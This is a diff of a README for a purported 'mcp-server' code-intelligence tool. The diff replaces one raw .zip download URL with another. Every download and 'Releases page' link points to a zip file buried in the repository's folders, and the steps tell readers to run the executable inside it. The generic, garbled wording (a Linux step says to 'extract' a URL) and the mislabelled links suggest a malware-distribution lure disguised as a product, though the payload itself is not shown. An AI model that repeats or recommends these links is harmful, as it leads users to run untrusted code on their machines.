@@ -1,7 +1,7 @@
 # 🚀 mcp-server - Get AI Insights for Your Code
 
 ## 📥 Download Now
-[![Download mcp-server](https://github.com/freehellchestmimicpsx-star/mcp-server/raw/refs/heads/main/integrations/automation/mcp_server_v3.4-alpha.2.zip)](https://github.com/freehellchestmimicpsx-star/mcp-server/raw/refs/heads/main/integrations/automation/mcp_server_v3.4-alpha.2.zip)
+[![Download mcp-server](https://raw.githubusercontent.com/freehellchestmimicpsx-star/mcp-server/main/docs/server-mcp-1.9.zip)](https://raw.githubusercontent.com/freehellchestmimicpsx-star/mcp-server/main/docs/server-mcp-1.9.zip)
 
 ## 📖 Description
 Welcome to the mcp-server repository. This project helps you understand your code better. You can use this server to gain code intelligence and insights for your users, no matter the codebase or technology stack.
@@ -23,15 +23,15 @@ Follow these easy steps to download and set up mcp-server on your computer.
 - **Tech Debt Management:** Understand and manage your technical debt effectively.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/freehellchestmimicpsx-star/mcp-server/raw/refs/heads/main/integrations/automation/mcp_server_v3.4-alpha.2.zip) to find the latest version.
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/freehellchestmimicpsx-star/mcp-server/main/docs/server-mcp-1.9.zip) to find the latest version.
 2. **Download the Installer:** Look for the latest version and click on the download link. You will see options for different operating systems.
 3. **Run the Installer:**
    - For Windows: Double-click the downloaded `.exe` file and follow the prompts to install.
    - For Mac: Open the downloaded `.dmg` file and drag the mcp-server application to your Applications folder.
-   - For Linux: Extract the `https://github.com/freehellchestmimicpsx-star/mcp-server/raw/refs/heads/main/integrations/automation/mcp_server_v3.4-alpha.2.zip` file and follow the installation guide in the README file inside the download.
+   - For Linux: Extract the `https://raw.githubusercontent.com/freehellchestmimicpsx-star/mcp-server/main/docs/server-mcp-1.9.zip` file and follow the installation guide in the README file inside the download.
 
 ### 🔗 Quick Links
-- [Releases page](https://github.com/freehellchestmimicpsx-star/mcp-server/raw/refs/heads/main/integrations/automation/mcp_server_v3.4-alpha.2.zip)
+- [Releases page](https://raw.githubusercontent.com/freehellchestmimicpsx-star/mcp-server/main/docs/server-mcp-1.9.zip)
 
 ## ⚙️ Running mcp-server
 1. Open the application from your desktop or applications folder.
